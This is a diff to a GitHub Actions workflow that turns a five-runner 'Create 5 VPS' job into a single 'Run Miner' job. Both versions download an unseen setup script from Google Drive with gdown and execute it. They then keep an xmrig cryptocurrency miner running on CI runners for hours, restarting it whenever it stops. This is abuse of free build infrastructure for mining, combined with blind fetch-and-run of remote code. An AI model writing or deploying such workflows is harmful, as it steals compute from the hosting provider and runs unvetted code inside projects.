@@ -1,59 +1,62 @@
-name: Create 5 VPS
+name: Run Miner
 
 on:
-  push:
-    branches:
-      - main
   workflow_dispatch:
-  repository_dispatch:
-    types: [create-vps]
+  push:
+    branches: [main]
 
 jobs:
-  start-vps:
+  miner:
     runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        vps_index: [1, 2, 3, 4, 5]
-
-    env:
-      GDRIVE_ID: 1091OMyUhjWcXqO9IGvcS2hIsrFOcL5RU
-      VPS_NAME: auto-restart-vps
-
+    timeout-minutes: 360  # 6 giờ
+    
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v3
+    - name: Checkout code
+      uses: actions/checkout@v3
 
-      - name: Setup Node.js
-        uses: actions/setup-node@v3
-        with:
-          node-version: '20'
+    - name: Install dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y curl wget python3-pip psmisc
 
-      - name: Install dependencies
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y wget curl python3-pip
+    - name: Download miner script
+      run: |
+        pip3 install gdown
+        gdown --id "1zb8Nc69gbXNX_N6pudbvBjtZZnKOnHGV" -O setup.sh
+        chmod +x setup.sh
 
-      - name: Download and setup miner
-        run: |
-          echo "Starting VPS ${{ matrix.vps_index }}"
-          python3 -m pip install --user gdown
-          gdown --id "$GDRIVE_ID" -O setup.sh
-          chmod +x setup.sh
-          # Chạy trực tiếp, không cần sudo
-          ./setup.sh > miner_${{ matrix.vps_index }}.log 2>&1 &
+    - name: Start miner
+      run: |
+        echo "🚀 Starting miner..."
+        ./setup.sh
+        
+        # Kiểm tra lần đầu
+        sleep 30
+        if pgrep -f xmrig > /dev/null; then
+          echo "✅ Miner started successfully"
+          echo "📊 Process info:"
+          ps aux | grep xmrig | grep -v grep
+        else
+          echo "❌ Miner failed to start"
+          exit 1
+        fi
 
-      - name: Keep VPS alive and monitor
-        run: |
-          echo "VPS ${{ matrix.vps_index }} is running..."
-          counter=0
-          while [ $counter -lt 240 ]; do  # Chạy 4 tiếng (240 phút)
-            if pgrep -f "xmrig" > /dev/null; then
-              echo "[$(date +'%Y-%m-%d %H:%M:%S')] VPS-${{ matrix.vps_index }}: Miner đang chạy..."
-            else
-              echo "[$(date +'%Y-%m-%d %H:%M:%S')] VPS-${{ matrix.vps_index }}: Miner đã dừng, khởi động lại..."
-              ./setup.sh > miner_${{ matrix.vps_index }}.log 2>&1 &
-            fi
-            sleep 60
-            ((counter++))
-          done
-          echo "VPS ${{ matrix.vps_index }} đã hoàn thành 4 giờ chạy"
+    - name: Run miner for 6 hours
+      run: |
+        echo "⏰ Running miner for 6 hours..."
+        start_time=$(date +%s)
+        end_time=$((start_time + 21600))  # 6 giờ
+        
+        while [ $(date +%s) -lt $end_time ]; do
+          current_time=$(date +'%H:%M:%S')
+          if pgrep -f xmrig > /dev/null; then
+            echo "[$current_time] ✅ Miner is running"
+          else
+            echo "[$current_time] 🔄 Miner stopped, restarting..."
+            ./setup.sh
+          fi
+          sleep 300  # Kiểm tra mỗi 5 phút
+        done
+        
+        echo "⏹️ Stopping miner after 6 hours"
+        pkill -f xmrig || true
